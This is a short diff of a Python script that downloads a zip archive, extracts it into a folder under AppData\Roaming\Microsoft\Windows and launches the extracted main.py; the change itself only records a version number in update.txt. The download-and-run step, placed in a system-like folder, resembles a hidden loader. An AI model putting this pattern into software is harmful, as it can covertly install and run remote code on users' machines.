@@ -35,7 +35,11 @@ with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows
         open(file_path, 'wb').write(r.content)
         with zipfile.ZipFile(file_path, 'r') as zip_ref:
             zip_ref.extractall(target_path)
+        with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as upd:
+            upd.write(str(ver1))
+            upd.close()
         os.remove(file_path)
+    ver.close()
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])
 
